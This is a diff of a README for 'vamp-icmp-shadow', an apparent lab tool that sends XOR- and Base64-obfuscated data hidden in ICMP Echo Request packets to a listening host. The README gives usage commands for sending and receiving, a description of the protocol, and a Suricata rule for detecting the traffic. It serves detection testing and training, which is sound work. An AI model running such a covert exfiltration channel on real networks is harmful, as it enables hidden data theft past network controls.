@@ -1,95 +1,149 @@
-# vamp-icmp-shadow
+<h1 align="center">vamp-icmp-shadow</h1>
+<p align="center">
+  <strong>Covert ICMP data channel for Red/Blue Team detection validation and IDS/IPS rule testing</strong><br>
+  <em>VampSecure Labs · Security Research Division</em>
+</p>
 
-**VampSecure Labs — Security Research Division**  
-Canal encubierto ICMP para laboratorio Red/Blue Team: exfiltración de datos en tráfico ICMP.
+<p align="center">
+  <img src="https://img.shields.io/badge/python-3.10%2B-blue?style=flat-square&logo=python&logoColor=white">
+  <img src="https://img.shields.io/badge/platform-linux%20%7C%20macos-lightgrey?style=flat-square">
+  <img src="https://img.shields.io/badge/license-research%20only-red?style=flat-square">
+  <img src="https://img.shields.io/badge/VampSecure-Labs-8B0000?style=flat-square">
+</p>
 
 ---
 
-## Descripción
+## Overview
 
-Herramienta de laboratorio que demuestra la técnica de canal encubierto (covert channel)
-mediante paquetes ICMP Echo Request. Los datos se ofuscan con cifrado XOR + codificación
-Base64 y se fragmentan en chunks de 200 bytes para ser transportados en el campo de payload
-de los paquetes ICMP.
+`vamp-icmp-shadow` implements a covert data channel over ICMP for use in authorized Red/Blue Team lab environments. It demonstrates that the payload field of ICMP Echo Request packets can be used as a data exfiltration vector, bypassing network controls that filter only by protocol or port number without performing deep packet inspection on ICMP content.
 
-Diseñada para entornos de laboratorio Blue Team (detección de tráfico anómalo ICMP) y
-Red Team (demostración de exfiltración encubierta). **No es una herramienta de comunicación
-segura** — el cifrado XOR es simétrico y trivialmente reversible con la clave.
+The tool's primary purpose is **defensive**: validating that IDS/IPS rules (Snort, Suricata) correctly detect non-standard ICMP payloads, training Blue Team analysts to recognize the traffic pattern, and documenting the attack vector in network security audit reports. It must not be used outside of self-owned lab environments or without explicit written authorization.
 
-## Técnica implementada
+Data is obfuscated via XOR with a shared key, encoded in Base64, prefixed with a magic marker (`VSHDW:`), and split into fixed-size chunks transmitted as individual ICMP Echo Request packets. The receiver side reassembles and decodes the stream.
+
+## Features
+
+- **`send` mode** — XOR-encrypts a message with the configured key, Base64-encodes it, fragments it into 200-byte chunks, and sends each chunk as an ICMP Echo Request (type=8) with sequential sequence numbers
+- **`listen` mode** — captures ICMP Echo Request packets via Scapy BPF filter `icmp`, verifies the `VSHDW:` magic prefix, decodes Base64, applies XOR to recover plaintext, and displays captured messages in Rich panels with source IP and sequence number
+- **XOR + Base64 obfuscation** — symmetric cipher (XOR key repeats cyclically); the same key decrypts: `XOR(XOR(data, key), key) = data`
+- **Configurable key** via `--key` parameter or `--key-file` (first line of file) — default key is `VAMP_KEY_2026`
+- **Magic-prefix filtering** — the receiver silently ignores all ICMP traffic that does not carry the `VSHDW:` prefix, making it quiet in mixed-traffic environments
+- **Verbose mode** (`-v`) shows all ICMP packets received including those without the magic prefix, useful for debugging IDS rule placement
+- **Chunk-based fragmentation** — messages longer than 200 obfuscated bytes are automatically split; the receiver accumulates chunks per source IP ordered by ICMP sequence number
+- **Root privilege enforcement** — exits with an error if not run as root, as raw packet capture requires `CAP_NET_RAW`
+- Rich console output: sender displays a per-packet table with payload preview, byte count, and status; receiver shows a panel per decoded message
+
+## Requirements
 
 ```
-Datos originales → XOR(clave) → Base64 → Prefijo "VSHDW:" → Payload ICMP
-```
-
-El receptor filtra paquetes ICMP type=8 con payload que comience por el prefijo VSHDW:,
-extrae el payload, revierte Base64 y XOR, y reconstruye el mensaje original.
-
-## Requisitos
-
-- Python 3.9+
-- Permisos de root / `CAP_NET_RAW` (necesario para Scapy)
-- Dependencias: `scapy>=2.5.0`, `rich>=13.7.0`
-
-## Instalación
-
-```bash
-python3 -m venv .venv
-source .venv/bin/activate
 pip install -r requirements.txt
 ```
 
-## Uso
+| Package | Version |
+|---------|---------|
+| `scapy` | >= 2.5.0 |
+| `rich`  | >= 13.7.0 |
+
+Standard library: `argparse`, `base64`, `os`, `sys`, `time`, `datetime`, `pathlib`.
+
+## Installation
 
 ```bash
-# Enviar mensaje a través de canal ICMP
-sudo python3 vamp_icmp_shadow.py send 192.168.1.100 "Mensaje secreto de laboratorio"
-
-# Enviar con clave personalizada y modo verbose
-sudo python3 vamp_icmp_shadow.py send 192.168.1.100 "Mensaje de test" --key MICLAVELAB --verbose
-
-# Enviar con clave desde fichero
-sudo python3 vamp_icmp_shadow.py send 192.168.1.100 "Test" --key-file clave.txt
-
-# Escuchar en interfaz (receptor)
-sudo python3 vamp_icmp_shadow.py listen eth0
-
-# Escuchar con clave personalizada
-sudo python3 vamp_icmp_shadow.py listen eth0 --key MICLAVELAB --verbose
+git clone https://github.com/belky-me/vamp-icmp-shadow.git
+cd vamp-icmp-shadow
+pip install -r requirements.txt
 ```
 
-## Opciones send
+Requires root or `CAP_NET_RAW` capability for both send and listen modes.
 
-| Opción | Descripción |
-|--------|-------------|
-| `target` | IP del receptor |
-| `data` | Mensaje a transmitir |
-| `--key` | Clave XOR (por defecto: `VAMP_KEY_2026`) |
-| `--key-file` | Fichero con la clave XOR |
-| `--verbose` | Mostrar tabla detallada de chunks enviados |
+## Usage
 
-## Opciones listen
+```bash
+python vamp_icmp_shadow.py --help
+```
 
-| Opción | Descripción |
-|--------|-------------|
-| `interface` | Interfaz de red a escuchar |
-| `--key` | Clave XOR (debe coincidir con el emisor) |
-| `--key-file` | Fichero con la clave XOR |
-| `--verbose` | Mostrar detalles de cada paquete capturado |
+Two subcommands are available: `send` and `listen`.
 
-## Uso en laboratorio Blue Team
+```
+usage: vamp-icmp-shadow {send,listen} ...
 
-La herramienta está pensada para que los equipos de detección practiquen la identificación
-de tráfico ICMP anómalo: payloads de longitud inusual, contenido Base64 en ICMP, frecuencia
-irregular de Echo Requests.
+subcommands:
+  send      Send a message via the ICMP Shadow channel
+  listen    Listen for incoming ICMP Shadow channel traffic
+```
 
-## Aviso legal
+### Examples
 
-**Uso exclusivo en entornos de laboratorio propios o con autorización escrita del propietario.**  
-El uso de canales encubiertos en redes de producción sin autorización puede constituir un
-delito. VampSecure Studios no se responsabiliza del uso indebido de esta herramienta.
+**Send a short message to a lab target (default key):**
+```bash
+sudo python vamp_icmp_shadow.py send -t 192.168.1.10 -d "shadow test"
+```
+
+**Send a message with a custom XOR key:**
+```bash
+sudo python vamp_icmp_shadow.py send -t 192.168.1.10 -d "exfil payload" -k "MY_SECRET_KEY"
+```
+
+**Send using a key loaded from a file:**
+```bash
+sudo python vamp_icmp_shadow.py send -t 192.168.1.10 -d "test" --key-file /etc/lab/icmp.key
+```
+
+**Send with verbose output (shows per-packet errors and status):**
+```bash
+sudo python vamp_icmp_shadow.py send -t 10.0.0.5 -d "blue team test" -v
+```
+
+**Listen on interface eth0 for incoming Shadow channel traffic:**
+```bash
+sudo python vamp_icmp_shadow.py listen -i eth0
+```
+
+**Listen with a custom key and verbose mode (shows non-Shadow ICMP too):**
+```bash
+sudo python vamp_icmp_shadow.py listen -i eth0 -k "MY_SECRET_KEY" -v
+```
+
+**Listen using a key file:**
+```bash
+sudo python vamp_icmp_shadow.py listen -i eth0 --key-file /etc/lab/icmp.key
+```
+
+## Protocol Overview
+
+```
+Sender:
+  plaintext → XOR(key) → Base64 → "VSHDW:" + B64_CHUNK
+  Each chunk → ICMP Echo Request (type=8, seq=N, payload=VSHDW:...)
+
+Receiver:
+  ICMP Echo Request captured → check for "VSHDW:" prefix
+  → Base64 decode → XOR(key) → plaintext
+  → display with source IP and sequence number
+```
+
+Chunk size: 200 bytes of the obfuscated Base64 string per packet.  
+Inter-packet delay: 50 ms to avoid overwhelming the network stack.
+
+## Blue Team Detection Notes
+
+This tool is designed to make its own traffic detectable. Example Suricata signature that fires on the `VSHDW:` magic prefix in ICMP payloads:
+
+```
+alert icmp any any -> any any (msg:"VampSecure ICMP Shadow channel"; \
+  content:"VSHDW:"; itype:8; sid:9000001; rev:1;)
+```
+
+Use this tool to verify that your IDS signature correctly triggers before writing it into the production ruleset.
+
+## Part of VampSecure Labs Toolkit
+
+This tool is part of the **VampSecure Labs Security Toolkit** — a collection of research-grade security tools for authorized penetration testing and red/blue team exercises.
+
+- Full toolkit: [github.com/belky-me](https://github.com/belky-me)
+- Orchestrator: [github.com/belky-me/vamp-orchestrator](https://github.com/belky-me/vamp-orchestrator)
 
 ---
 
 © VampSecure Studios — VampSecure Labs Security Research Division  
-Licencia: MIT
+For authorized security testing only.
